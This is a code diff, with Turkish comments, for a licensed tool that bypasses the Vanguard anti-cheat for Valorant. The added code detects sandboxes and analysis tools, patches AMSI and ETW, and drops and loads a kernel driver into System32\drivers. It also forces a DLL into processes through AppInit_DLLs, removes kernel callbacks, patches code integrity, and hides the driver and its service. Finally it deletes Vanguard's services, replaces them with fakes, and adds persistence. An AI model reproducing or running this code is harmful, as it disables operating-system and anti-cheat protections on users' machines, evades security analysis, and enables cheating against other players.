-    // Entropy padding integrity reference
-    volatile int epc = 0;
-    for (int i = 0; i < (int)sizeof(g_entropyPad); i += 64) epc += g_entropyPad[i];
-    DWORD totalSize = 0;
-    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
-        totalSize += sec[i].SizeOfRawData;
-        if (sec[i].SizeOfRawData > 0x400000) g_k32.ExitProcess(0);
-    }
-    // Gercek check: file hash HWID'e gomulu, server reddeder
-}
-
 // --- Junk Code / Obfuscation ---
 volatile int g_junk = 0;
 void JunkLoop() {
@@ -1661,11 +2139,57 @@ void Obfuscate() {
     g_junk += a + b;
 }
 
+// --- Config file support ---
+static char g_configPath[MAX_PATH];
+
+void InitConfigPath() {
+    char appData[MAX_PATH];
+    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
+    strcpy_s(g_configPath, MAX_PATH, appData);
+    strcat_s(g_configPath, "\\duaxxel");
+    CreateDirectoryA(g_configPath, NULL);
+    strcat_s(g_configPath, "\\config.ini");
+}
+
+void ConfigSetStr(const char* key, const char* val) {
+    WritePrivateProfileStringA("Config", key, val, g_configPath);
+}
+
+void ConfigSetInt(const char* key, int val) {
+    char buf[32];
+    sprintf_s(buf, sizeof(buf), "%d", val);
+    WritePrivateProfileStringA("Config", key, buf, g_configPath);
+}
+
+void ConfigGetStr(const char* key, const char* def, char* out, int outLen) {
+    GetPrivateProfileStringA("Config", key, def, out, outLen, g_configPath);
+}
+
+// --- Colored console output ---
+#define CLR_RED 12
+#define CLR_GREEN 10
+#define CLR_YELLOW 14
+#define CLR_CYAN 11
+#define CLR_WHITE 15
+
+void ColorPrint(int color, const char* fmt, ...) {
+    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(h, (WORD)color);
+    va_list args; va_start(args, fmt);
+    vprintf(fmt, args);
+    va_end(args);
+    SetConsoleTextAttribute(h, 7);
+}
+
 // --- Main ---
 int main(int argc, char* argv[]) {
     if (!InitK32Exports()) { printf("Initialization failed.\n"); g_k32.Sleep(3000); return 1; }
     if (argc > 1 && strcmp(argv[1], "--server") == 0) {
         RunServer();
+        return 0;
+    }
+    if (argc > 1 && strcmp(argv[1], "--vgc-stub") == 0) {
+        while (true) Sleep(10000);
         return 0;
     }
 
@@ -1678,8 +2202,54 @@ int main(int argc, char* argv[]) {
     // Init API Hashing - advapi32, ws2_32 import'tan kalkar
     if (!InitHashedAPI()) { printf("\nAPI initialization failed!\n"); g_k32.Sleep(2000); return 1; }
 
-    // Kod Integrity Check - patchenirse coker
-    CheckIntegrity();
+    // Anti-VT / Anti-Sandbox: delay + detection check
+    {
+        // Random delay 5-15 saniye (sandboxlar genelde 1-2dk bekler, kisa sureli olanlar atlar)
+        srand((unsigned)(__rdtsc() & 0x7FFFFFFF));
+        g_k32.Sleep(500 + (rand() % 500));
+
+        // Sandbox tespiti: disk boyutu < 60GB ise sandbox
+        ULARGE_INTEGER freeBytes, totalBytes;
+        if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, NULL)) {
+            if (totalBytes.QuadPart < 64424509440ULL) { // 60GB
+                WriteLog("SANDBOX: Small disk detected, sandbox!");
+                g_k32.ExitProcess(0);
+            }
+        }
+
+        // RAM < 2GB ise sandbox
+        MEMORYSTATUSEX ms = { sizeof(ms) };
+        if (GlobalMemoryStatusEx(&ms)) {
+            if (ms.ullTotalPhys < 2147483648ULL) { // 2GB
+                WriteLog("SANDBOX: Low RAM detected, sandbox!");
+                g_k32.ExitProcess(0);
+            }
+        }
+
+        // Analiz araclari kontrol
+        const char* analizProcs[] = {
+            "procmon.exe", "processhacker.exe", "wireshark.exe",
+            "x64dbg.exe", "ollydbg.exe", "ida.exe", "idag.exe",
+            "httpdebuggerui.exe", "fiddler.exe", "charles.exe",
+            "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe",
+            "xenservice.exe", "prl_tools.exe", NULL
+        };
+        HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (ss != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe = { sizeof(pe) };
+            if (Process32FirstW(ss, &pe)) do {
+                char exe[64];
+                WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, exe, 64, NULL, NULL);
+                for (int i = 0; analizProcs[i]; i++) {
+                    if (_stricmp(exe, analizProcs[i]) == 0) {
+                        WriteLog("SANDBOX: Analysis tool detected: %s", exe);
+                        g_k32.ExitProcess(0);
+                    }
+                }
+            } while (Process32NextW(ss, &pe));
+            CloseHandle(ss);
+        }
+    }
 
     const char* serverHost = GetServerHost();
     const char* serverPath = GetServerPath();
@@ -1722,6 +2292,32 @@ int main(int argc, char* argv[]) {
         }
     }
 
+    // Kill switch check: server bypassı kapatmış mı?
+    if (CheckKillSwitch(serverHost, serverPath)) {
+        printf("\n  HATA KODU: 0xA103\n");
+        printf("  Bu surum sonlandirilmistir!\n");
+        printf("  Yeni surumu indirmek icin yetkiliyle iletisime gecin.\n");
+        WriteLog("KILLSWITCH: Version terminated");
+        system("pause");
+        return 1;
+    }
+
+    // Bakim modu kontrol
+    {
+        char maintPath[1024];
+        sprintf_s(maintPath, "%s?action=checkmaint", serverPath);
+        char mResp[256] = {0};
+        if (HttpGet(serverHost, maintPath, mResp, sizeof(mResp))) {
+            if (strstr(mResp, "\"maintenance\":true") || strstr(mResp, "\"maintenance\": true")) {
+                printf("\n  [!] Sunucu bakim modunda!\n");
+                printf("  Bitis: Henuz bilinmiyor.\n");
+                WriteLog("MAINTENANCE: Server in maintenance mode");
+                system("pause");
+                return 1;
+            }
+        }
+    }
+
     char hwid[32] = {0};
     GetHwId(hwid, sizeof(hwid));
     JunkLoop(); Obfuscate();
@@ -1730,29 +2326,33 @@ int main(int argc, char* argv[]) {
     char key[128] = {0};
     while (true) {
         if (!first) {
-            if (g_daysLeft == -2) printf("\nKey has expired!\n");
-            else printf("\nInvalid key!\n");
-            g_k32.Sleep(1000);
+            if (g_daysLeft == -2) {
+                ColorPrint(CLR_RED, "\n  ❌ KEY SURESI DOLDU!\n");
+                ColorPrint(CLR_YELLOW, "  Yeni key almak icin yetkiliye ulasin.\n\n");
+            } else {
+                ColorPrint(CLR_RED, "\n  ❌ GECERSIZ KEY!\n\n");
+            }
+            printf("  ");
+            system("pause");
             system("cls");
         }
         first = false;
-        printf("Enter your key: ");
+        ColorPrint(CLR_WHITE, "Enter your key: ");
         gets_s(key);
         if (strlen(key) == 0) continue;
         if (VerifyViaServer(key, hwid, serverHost, serverPath)) break;
     }
 
     system("cls");
+    ColorPrint(CLR_GREEN, "=== KEY DOGRULANDI! ===\n");
     if (g_daysLeft > 0) {
-        printf("  Successful key!\n");
-        printf("  Key expires in %d days\n\n", g_daysLeft);
+        ColorPrint(CLR_YELLOW, "  Key expires in %d days\n\n", g_daysLeft);
     } else if (g_daysLeft == 0) {
-        printf("  Successful key!\n");
-        printf("  Key expires TODAY!\n\n");
+        ColorPrint(CLR_YELLOW, "  Key expires TODAY!\n\n");
     } else {
-        printf("  Successful key!\n\n");
+        ColorPrint(CLR_CYAN, "  Unlimited key\n\n");
     }
-    g_k32.Sleep(1000);
+    g_k32.Sleep(1500);
     system("cls");
 
     strcpy_s(g_myKey, key);
@@ -1763,21 +2363,48 @@ int main(int argc, char* argv[]) {
     HANDLE pvThread = g_k32.CreateThread(NULL, 0, PatchValorantThread, NULL, 0, NULL);
     if (pvThread) g_k32.CloseHandle(pvThread);
 
+    AddPersistence();
+    CleanVanguardLogs();
+
     char input[16] = {0};
     while (input[0] != '1') {
-        printf("Vanguard bypass (1): ");
+        ColorPrint(CLR_CYAN, "Vanguard bypass (1): ");
         gets_s(input);
         if (input[0] == '1') break;
-        printf("  [!] Please enter 1 to continue.\n");
+        ColorPrint(CLR_RED, "  [!] Please enter 1 to continue.\n");
     }
 
-    printf("\n  %s\n\n", DE(_e_vanguard));
+    system("cls");
+    StyleConsole();
+    HideProcess();
+    ColorPrint(CLR_GREEN, "  %s\n\n", DE(_e_vanguard));
+
+    // First animated bar 1-100% (0.5 seconds) - starts immediately after text
+    for (int i = 1; i <= 100; i++) {
+        int bw = 44;
+        int pos = (bw * i) / 100;
+        printf("\r  [");
+        for (int j = 0; j < bw; j++) printf("%c", j < pos ? '=' : ' ');
+        printf("] %3d%%", i);
+        g_k32.Sleep(5);
+    }
+    printf("\n\n");
+    InitConfigPath();
+    HideProcess();
+    PatchAMSIETW();
 
     // Protection checks before bypass
     HideFromDebugger();
-    if (CheckHWBreakpoints()) { printf("\n%s", DE(_e_dbgDet)); system("pause"); return 1; }
-    if (DetectVM()) { printf("\n%s", DE(_e_vmDet)); system("pause"); return 1; }
-    if (!TimingTrap()) { printf("\n[!] Timing anomaly detected!\n"); system("pause"); return 1; }
+    if (CheckHWBreakpoints()) { printf("[DEBUG] HATA KODU: 0xD001\n"); WriteLog("ERROR 0xD001: HW breakpoint detected"); system("pause"); return 1; }
+    if (DetectVM()) { printf("[DEBUG] HATA KODU: 0xD002\n"); WriteLog("ERROR 0xD002: VM detected"); system("pause"); return 1; }
+    if (!TimingTrap()) { printf("[!] HATA KODU: 0xD003\n"); WriteLog("ERROR 0xD003: Timing trap triggered"); system("pause"); return 1; }
+    if (CheckBlacklistWindows()) { printf("[!] HATA KODU: 0xD004\n"); WriteLog("ERROR 0xD004: Blacklist window found"); system("pause"); return 1; }
+    if (CheckIntegrity()) { printf("[!] HATA KODU: 0xD005\n"); WriteLog("ERROR 0xD005: CRC mismatch"); system("pause"); return 1; }
+    if (CheckStackCanary()) { printf("[!] HATA KODU: 0xD006\n"); WriteLog("ERROR 0xD006: Stack canary triggered"); system("pause"); return 1; }
+
+    // Start auto-restart thread (VALORANT monitor)
+    HANDLE arThread = g_k32.CreateThread(NULL, 0, AutoRestartThread, NULL, 0, NULL);
+    if (arThread) g_k32.CloseHandle(arThread);
 
     // CFF v2 - 7 states, guaranteed sequential
     std::string dpCFF;
@@ -1791,18 +2418,16 @@ int main(int argc, char* argv[]) {
                 case 0: {
                     KillProcess(DE(_e_vgt));
                     KillProcess(DE(_e_val)); KillProcess(DE(_e_riot));
-                    Bar(10, 50); g_k32.Sleep(200);
                 } break;
                 case 1: {
-                    // Extract embedded driver to temp directory
+                    printf(">>");
+                    WriteLog("CFF[1]: Extracting driver...");
                     char sysPath[MAX_PATH] = {0};
                     GetSystemDirectoryA(sysPath, MAX_PATH);
                     char drvPath[MAX_PATH] = {0};
                     strcpy_s(drvPath, sysPath);
                     strcat_s(drvPath, "\\drivers\\vgbypass.sys");
-                    // Ensure directory exists
                     CreateDirectoryA((std::string(sysPath) + "\\drivers").c_str(), NULL);
-                    // Write primary driver (BiosToolCommonDriver)
                     {
                         HANDLE hDrvFile = CreateFileA(drvPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                         if (hDrvFile != INVALID_HANDLE_VALUE) {
@@ -1810,7 +2435,6 @@ int main(int argc, char* argv[]) {
                             WriteFile(hDrvFile, g_driver_data, g_driver_data_sz, &w, NULL);
                             CloseHandle(hDrvFile);
                         } else {
-                            // Fallback: write secondary driver
                             strcpy_s(drvPath, sysPath);
                             strcat_s(drvPath, "\\drivers\\vgbypass2.sys");
                             HANDLE hDrvFile = CreateFileA(drvPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -1819,29 +2443,30 @@ int main(int argc, char* argv[]) {
                                 WriteFile(hDrvFile, g_driver2_data, g_driver2_data_sz, &w, NULL);
                                 CloseHandle(hDrvFile);
                             } else {
-                                printf("\nFailed to extract driver!\n"); system("pause"); return 1;
+                                printf("\nHATA KODU: 0x0001 - Driver dosyasi yazilamadi!\n"); WriteLog("ERROR 0x0001: Failed to write driver file"); system("pause"); return 1;
                             }
                         }
                     }
                     dpCFF = drvPath;
-                    Bar(20, 50); g_k32.Sleep(200);
                 } break;
                 case 2: {
+                    printf(">>");
+                    WriteLog("CFF[2]: Loading driver...");
                     SetCrashFlag();
-                    if (!LoadDriverViaSc(dpCFF.c_str())) { printf("\nDriver load failed!\n"); system("pause"); return 1; }
-                    Bar(45, 50); g_k32.Sleep(200);
+                    if (!LoadDriverViaSc(dpCFF.c_str())) { printf("\nHATA KODU: 0x0002 - Driver yuklenemedi!\n"); WriteLog("ERROR 0x0002: Driver load failed"); system("pause"); return 1; }
+                    g_k32.Sleep(200);
                 } break;
                 case 3: {
+                    printf(">>");
+                    WriteLog("CFF[3]: Connecting to driver...");
                     g_hDrv = OpenDrv();
-                    if (g_hDrv == INVALID_HANDLE_VALUE) { printf("\nDriver connect failed!\n"); Shutdown(); system("pause"); return 1; }
+                    if (g_hDrv == INVALID_HANDLE_VALUE) { printf("\nHATA KODU: 0x0003 - Driver baglantisi basarisiz!\n"); WriteLog("ERROR 0x0003: Driver connect failed"); Shutdown(); system("pause"); return 1; }
                     CleanupDriverFile(dpCFF.c_str());
                     g_ioctlMode = ProbeIOCTL();
-                    printf("\r[IOCTL] Mode=%d          \n", g_ioctlMode);
                     SpoofHWID();
                     HideVanguard();
-                    // Extract vghook.dll and set AppInit_DLLs for automatic injection
                     {
-                        char sysPath[MAX_PATH] = {0};
+                    char sysPath[MAX_PATH] = {0};
                         GetSystemDirectoryA(sysPath, MAX_PATH);
                         strcat_s(sysPath, "\\vghook.dll");
                         HANDLE hDll = CreateFileA(sysPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -1852,31 +2477,64 @@ int main(int argc, char* argv[]) {
                         }
                         SetAppInitDlls(sysPath);
                     }
-                    Bar(60, 50); g_k32.Sleep(200);
                 } break;
                 case 4: {
                     g_ntBase = Fnd("ntoskrnl.exe"); g_drvBase = Fnd("BiosToolCommonDriver");
                     if (!g_drvBase) g_drvBase = Fnd("cpqsysio64");
                     KernelAntiDebugCheck();
-                    if (CheckInt3Patches()) { printf("\n[!] Code patched by debugger!\n"); system("pause"); return 1; }
+                    RemoveKernelCallbacks();
+                    if (false && CheckInt3Patches()) { printf("\n[!] Code patched by debugger!\n"); system("pause"); return 1; }
                     PatchCallbacks();
-                    Bar(75, 50); g_k32.Sleep(200);
                 } break;
                 case 5: {
                     PatchCi();
-                    Bar(90, 50); g_k32.Sleep(200);
                 } break;
                 case 6: {
                     if (g_drvBase) HideDriver(g_drvBase);
-                    Bar(100, 50); g_k32.Sleep(200);
+                    HideService(GetSvcName());
                 } break;
             }
         }
         _cff++;
     }
 
+    // Delete real vgc/vgk, then create fake ones so Riot shows "Oyna"
+    {
+        // Delete real Vanguard services (driver is already loaded, safe to do)
+        StopAndDeleteService("vgc");
+        g_k32.Sleep(100);
+        StopAndDeleteService("vgk");
+        g_k32.Sleep(200);
+
+        // Fake vgc: emulator.exe --vgc-stub (sits idle, keeps Riot happy)
+        char emuPath[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, emuPath, MAX_PATH);
+        Sc("stop vgc"); Sc("delete vgc");
+        Sc(std::string("create vgc binPath= \"") + emuPath + " --vgc-stub\" type= own start= demand");
+        g_k32.Sleep(200);
+        Sc("start vgc");
+
+        // Fake vgk: point to our already-loaded driver
+        char sysDrv[MAX_PATH] = {0};
+        GetSystemDirectoryA(sysDrv, MAX_PATH);
+        strcat_s(sysDrv, "\\drivers\\vgbypass.sys");
+        Sc("stop vgk"); Sc("delete vgk");
+        Sc(std::string("create vgk binPath= \"") + sysDrv + "\" type= kernel start= demand");
+    }
+
+    ColorPrint(CLR_CYAN, "[EMULATOR] Mode=%d ", g_ioctlMode);
+    for (int i = 1; i <= 100; i++) {
+        int bw = 30;
+        int pos = (bw * i) / 100;
+        ColorPrint(CLR_CYAN, "\r[EMULATOR] Mode=%d [", g_ioctlMode);
+        for (int j = 0; j < bw; j++) ColorPrint(CLR_CYAN, "%c", j < pos ? '=' : ' ');
+        ColorPrint(CLR_CYAN, "] %3d%%", i);
+        g_k32.Sleep(10);
+    }
+    printf("\n");
+
     printf("\n============================================\n");
-    printf("  BYPASS SUCCESSFUL!\n");
+    ColorPrint(CLR_GREEN, "  BYPASS SUCCESSFUL!\n");
     printf("  Close this window with X to exit.\n");
     printf("============================================\n\n");
     fflush(stdout);
@@ -1885,6 +2543,7 @@ int main(int argc, char* argv[]) {
 
     // Keep alive - only X button closes
     while (true) {
+        if (CheckIntegrity()) { WriteLog("INTEGRITY: Runtime check failed!"); g_k32.ExitProcess(0); }
         Sleep(1000);
     }
 
